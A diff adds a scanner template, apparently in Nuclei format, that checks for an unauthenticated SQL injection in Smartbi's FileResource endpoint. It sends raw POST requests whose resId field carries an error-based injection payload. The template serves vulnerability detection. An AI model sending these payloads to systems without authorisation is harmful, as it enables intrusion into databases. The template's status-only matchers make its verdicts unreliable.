@@ -1,0 +1,37 @@
+id: poc-yaml-smartbi-unauthenticated-sqli
+
+info:
+  name: poc-yaml-smartbi-unauthenticated-sqli
+  author: secking
+  severity: high
+  tags: xray-converted,sqli,unauth,ct-529826
+  reference:
+    - https://mp.weixin.qq.com/s/yeMhVYJks_wf6Po-sA6iOg
+
+http:
+  - raw:
+      - |
+        POST /vision/FileResource HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        op=OPEN&resId=LOGIN_BG_IMG%27%20AND%20extractvalue(1,concat(0,md5('{{rand_base(8)}}')))--+
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        POST /smartbi/vision/FileResource HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        op=OPEN&resId=LOGIN_BG_IMG%27%20AND%20extractvalue(1,concat(0,md5('{{rand_base(8)}}')))--+
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
